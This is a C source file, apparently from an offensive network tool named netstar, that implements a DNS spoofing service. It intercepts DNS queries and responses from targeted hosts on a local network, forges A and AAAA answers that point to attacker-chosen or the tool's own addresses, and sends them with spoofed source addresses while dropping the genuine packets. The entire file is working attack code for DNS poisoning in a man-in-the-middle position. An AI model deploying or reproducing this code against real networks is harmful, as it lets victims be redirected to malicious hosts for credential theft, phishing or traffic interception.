#include "netstar-dns-spoofing.h"

#include <collections/hashset/hashset.h>
#include <network/dns/dns.h>

#include <netstar-services.h>
#include <netstar-threads.h>

#include <netstar-scanner.h>

#include <netstar-forward.h>
#include <netstar-capture.h>

#include <netstar-utils.h>

#include <netstar.h>

#include <strings/strings.h>
#include <string.h>

#include <buffers/buffers.h>

#include <stdlib.h>
#include <stdio.h>

#include <stdarg.h>


static bool netstar_dns_spoofing_initialized;


int
netstar_dns_spoofing_resources_add(netstar_dns_spoofing_resources_t resources, struct netstar_dns_spoofing_resource *resource) {
  return hashset_insert(resources, hashset_clvalue(resource, sizeof(struct netstar_dns_spoofing_resource)));
}

static bool
netstar_dns_spoofing_resource(const void *value, va_list args) {
  struct netstar_dns_spoofing_resource *resource = (struct netstar_dns_spoofing_resource *)value;
  struct network_dns_question *question = va_arg(args, struct network_dns_question *);

  if (resource->rtype != question->qtype) // || resource->rclass != question->qclass)
    return false;

  if (string_equals(resource->name, question->name, true))
    return true;

  return string_equals(resource->name, "*", true);
}

static buffer_t *
netstar_dns_spoofing_message_build(netstar_t *netstar, struct netstar_dns_spoofing *spoofing_attack, struct netstar_capture_packet *packet) {
  struct netstar_dns_spoofing_resource *redirected_resource = NULL;

  struct network_dns_resource resource = {0};
  struct network_dns_question question = {0};
  struct network_dnshdr *dnsh  = NULL, response_dnsh = {0};

  network_dns_builder_t *builder = NULL;
  network_dns_parser_t *parser = NULL;

  uint8_t message[NETWORK_DNS_MESSAGE_SIZE] = {0};
  char domain[NETWORK_DNS_DOMAIN_LENGTH] = {0};
  size_t length;

// char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};

  buffer_t *buffer = NULL;

  if (!(parser = network_dns_parser_new(packet->layer4.payload, packet->layer4.payload_length)))
    goto _return;

// @ network:dns:parser:question
  if (!network_dns_parser_question(parser, &question))
    goto _return;
  memcpy(domain, question.name, string_length(question.name));

  if (!(redirected_resource = (struct netstar_dns_spoofing_resource *)hashset_findif(spoofing_attack->resources, netstar_dns_spoofing_resource, &question)))
    goto _return;

  if (question.qtype != NETWORK_DNS_TYPE_A && question.qtype != NETWORK_DNS_TYPE_AAAA)
    goto _return;

// @ network:dns:parser:header
  dnsh = network_dns_parser_header(parser);
  dnsh->id                  = ntohs(dnsh->id);
  dnsh->response            = 1;
  dnsh->rcode               = 0;
  dnsh->recursion_desired   = 1;
  dnsh->recursion_available = 1;
  dnsh->questions           = 1;
  dnsh->answers             = 1;
  dnsh->authority           = 0;
  dnsh->additional          = 0;

// @ network:dns:builder:new
// @ creates a message with the captured message header
  if (!(builder = network_dns_builder_new(dnsh, message, sizeof(message))))
    goto _return;
  network_dns_builder_setcompression(builder, true);

// @ network:dns:builder:questions
// @ create a question equivalent to the captured message
  network_dns_builder_questions(builder);
  network_dns_name_new(question.name, domain);
  network_dns_builder_question(builder, &question);

// @ network:dns:builder:asnwers
// @ create a response equivalent to the question of the captured message
  network_dns_builder_answers(builder);
  network_dns_name_new(resource.name, domain);
  resource.rtype  = question.qtype;
  resource.rclass = question.qclass;
  resource.ttl    = 3600; // 0xFFFF; // :-) 
  network_dns_builder_resource(builder, &resource);

// @ resolution rules to names/addresses
  switch (redirected_resource->rtype) {
    case NETWORK_DNS_TYPE_A: {
      struct network_dns_a a = {0};

      if (string_equals(redirected_resource->result, "*", true))
        network_ipaddr4_format(&netstar->managed.iface->addr, a.a, sizeof(a.a));
      else
        network_dns_a_new(&a, redirected_resource->result);

      network_dns_builder_a(builder, &a);

      break;
    }

    case NETWORK_DNS_TYPE_AAAA: {
      struct network_dns_aaaa aaaa = {0};

      if (string_equals(redirected_resource->result, "*", true))
        network_ipaddr6_format(&netstar->managed.iface->addr6, aaaa.aaaa, sizeof(aaaa.aaaa));
      else
        network_dns_aaaa_new(&aaaa, redirected_resource->result);

      network_dns_builder_aaaa(builder, &aaaa);

      break;      
    }
  }

// netstar_log("\b \b[ dns@poisoning ] intercepted %s %s from %s:%u - %s:%u\r\n",
//   domain, network_dns_type_u16tostr(redirected_resource->rtype),
//   network_ipaddr4_format(&packet->layer3.saddr.v4, saddr, sizeof(saddr)), packet->layer4.sport,
//   network_ipaddr4_format(&packet->layer3.daddr.v4, daddr, sizeof(daddr)), packet->layer4.dport
// );

  length = network_dns_builder_build(builder);

  if (!(buffer = buffer_new()))
    goto _return;

  buffer_append(buffer, message, length);

_return:
  network_dns_builder_free(builder);
  network_dns_parser_free(parser);

  return buffer;
}

static void
netstar_dns_spoofing(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
  struct netstar_dns_spoofing *spoofing_attack = (struct netstar_dns_spoofing *)args;
  buffer_t *buffer = NULL;

  if (packet->layer4.sport != NETWORK_DNS_PROTOCOL_PORT && packet->layer4.dport != NETWORK_DNS_PROTOCOL_PORT)
    goto _return;

  if (packet->type & NETSTAR_FORWARD_IPV4 && (network_ipaddr4_compare(&packet->layer3.saddr.v4, &netstar->managed.iface->addr) == 0 || network_ipaddr4_compare(&packet->layer3.daddr.v4, &netstar->managed.iface->addr) == 0))
    goto _return;
  if (packet->type & NETSTAR_FORWARD_IPV6 && (network_ipaddr6_compare(&packet->layer3.saddr.v6, &netstar->managed.iface->addr6) == 0 || network_ipaddr6_compare(&packet->layer3.daddr.v6, &netstar->managed.iface->addr6) == 0))
    goto _return;

// if (network_macaddr_compare(&packet->layer2.smac, &netstar->managed.iface->mac) == 0)
//  goto _return;

  if (netstar_hosts_size(spoofing_attack->target_hosts) && (!netstar_hosts_findipaddr4(spoofing_attack->target_hosts, &packet->layer3.saddr.v4) && !netstar_hosts_findipaddr6(spoofing_attack->target_hosts, &packet->layer3.saddr.v6)))
    goto _return;

  if (!(buffer = netstar_dns_spoofing_message_build(netstar, spoofing_attack, packet)))
    goto _return;

// @ the intercepted message is a response from the network gateway
  if ((packet->type & NETSTAR_FORWARD_IPV4) && packet->layer4.sport == NETWORK_DNS_PROTOCOL_PORT) {
    netstar_host_t *host = NULL;

    if (!(host = netstar_hosts_findipaddr4(netstar_scanner_scanned_hosts4, &packet->layer3.daddr.v4)))
      return;

    netstar_sendudp(
      &netstar->managed,              /* @ netstar          */
      &netstar->managed.iface->mac,   /* @ source mac       */
      &host->mac,                     /* @ destination mac  */
      &packet->layer3.saddr.v4,       /* @ source addr      */
      &packet->layer3.daddr.v4,       /* @ destination addr */
      packet->layer4.sport,           /* @ source port      */
      packet->layer4.dport,           /* @ destination port */
      (uint8_t *)buffer_ptr(buffer),  /* @ payload          */
      (uint16_t)buffer_length(buffer) /* @ payload length   */
    );
  } else if ((packet->type & NETSTAR_FORWARD_IPV6) && packet->layer4.sport == NETWORK_DNS_PROTOCOL_PORT) {
    netstar_host_t *host = NULL;

    if (!(host = netstar_hosts_findipaddr6(netstar_scanner_scanned_hosts6, &packet->layer3.daddr.v6)))
      return;

    netstar_sendudp6(
      &netstar->managed,              /* @ netstar          */
      &netstar->managed.iface->mac,   /* @ source mac       */
      &host->mac,                     /* @ destination mac  */
      &packet->layer3.saddr.v6,       /* @ source addr      */
      &packet->layer3.daddr.v6,       /* @ destination addr */
      packet->layer4.sport,           /* @ source port      */
      packet->layer4.dport,           /* @ destination port */
      (uint8_t *)buffer_ptr(buffer),  /* @ payload          */
      (uint16_t)buffer_length(buffer) /* @ payload length   */
    );
  }
// @ the intercepted message is a query from a device on the network
  else if ((packet->type & NETSTAR_FORWARD_IPV4) && packet->layer4.dport == NETWORK_DNS_PROTOCOL_PORT) {
    netstar_sendudp(
      &netstar->managed,              /* @ netstar          */
      &netstar->managed.iface->mac,   /* @ source mac       */
      &packet->layer2.smac,           /* @ destination mac  */
      &packet->layer3.daddr.v4,       /* @ source addr      */
      &packet->layer3.saddr.v4,       /* @ distiny addr     */
      packet->layer4.dport,           /* @ source port      */
      packet->layer4.sport,           /* @ destination port */
      (uint8_t *)buffer_ptr(buffer),  /* @ payload          */
      (uint16_t)buffer_length(buffer) /* @ payload length   */
    );
  } else if ((packet->type & NETSTAR_FORWARD_IPV6) && packet->layer4.dport == NETWORK_DNS_PROTOCOL_PORT) {
    netstar_sendudp6(
      &netstar->managed,              /* @ netstar          */
      &netstar->managed.iface->mac,   /* @ source mac       */
      &packet->layer2.smac,           /* @ destination mac  */
      &packet->layer3.daddr.v6,       /* @ source addr      */
      &packet->layer3.saddr.v6,       /* @ destination addr */
      packet->layer4.dport,           /* @ source port      */
      packet->layer4.sport,           /* @ destination port */
      (uint8_t *)buffer_ptr(buffer),  /* @ payload          */
      (uint16_t)buffer_length(buffer) /* @ payload length   */
    );
  }

  packet->flags &= ~(netstar_capture_packet_flags_t)NETSTAR_CAPTURE_PACKET_FORWARD;

_return:
  buffer_free(buffer);
}

int
netstar_dns_spoofing_new(struct netstar_dns_spoofing *spoofing_attack, netstar_t *netstar) {
  if (!(spoofing_attack->target_hosts = netstar_hosts_new()))
    goto _return;
  if (!(spoofing_attack->protected_hosts = netstar_hosts_new()))
    goto _return;

  if (!(spoofing_attack->resources = hashset_new(free)))
    goto _return;

  netstar_utils_filesystem_resources(spoofing_attack->resources, "share/dns/netstar-dns-spoofing.resources");

  spoofing_attack->netstar = netstar;

  return 1;

_return:
  netstar_dns_spoofing_free(spoofing_attack);
  return -1;
}

void
netstar_dns_spoofing_free(struct netstar_dns_spoofing *spoofing_attack) {
  if (spoofing_attack) {
    netstar_hosts_free(spoofing_attack->target_hosts);
    netstar_hosts_free(spoofing_attack->protected_hosts);

    hashset_free(spoofing_attack->resources);
  }
}

static void
netstar_dns_spoofing_initialize(netstar_t *netstar, void *context) {
  if (netstar_dns_spoofing_initialized)
    return;

  netstar_dns_spoofing_initialized = true;
}

static void
netstar_dns_spoofing_deinitialize(void *context) {
  struct netstar_dns_spoofing *spoofing_attack = (struct netstar_dns_spoofing *)context;

  if (!netstar_dns_spoofing_initialized)
    return;

  netstar_dns_spoofing_free(spoofing_attack);

  netstar_dns_spoofing_initialized = false;
}

static void
netstar_dns_spoofing_start(void *context) {
  struct netstar_dns_spoofing *spoofing_attack = (struct netstar_dns_spoofing *)context;

  if (spoofing_attack->status)
    return;

  netstar_forward_add(netstar_dns_spoofing, NETSTAR_FORWARD_UDP, spoofing_attack);

  spoofing_attack->status = true;

  netstar_log("#netstar-dns-poisoning started\r\n");
}

static void
netstar_dns_spoofing_stop(void *context) {
  struct netstar_dns_spoofing *spoofing_attack = (struct netstar_dns_spoofing *)context;

  if (!spoofing_attack->status)
    return;

  netstar_log("#netstar-dns-poisoning stopping...\r\n");
  netstar_forward_remove(netstar_dns_spoofing);

  spoofing_attack->status = false;
}

static struct netstar_dns_spoofing netstar_dns_spoofing_context;

static struct netstar_service netstar_dns_spoofing_context_service = {
  netstar_dns_spoofing_initialize, netstar_dns_spoofing_deinitialize,
  netstar_dns_spoofing_start, netstar_dns_spoofing_stop,
  "netstar:dns:spoofing", &netstar_dns_spoofing_context,
};

struct netstar_service *
netstar_dns_spoofing_service(void) {
  return &netstar_dns_spoofing_context_service;
}


__attribute__((__constructor__))
static inline void
netstar_dns_register_service(void) {
  netstar_services_register(netstar_dns_spoofing_service());
}
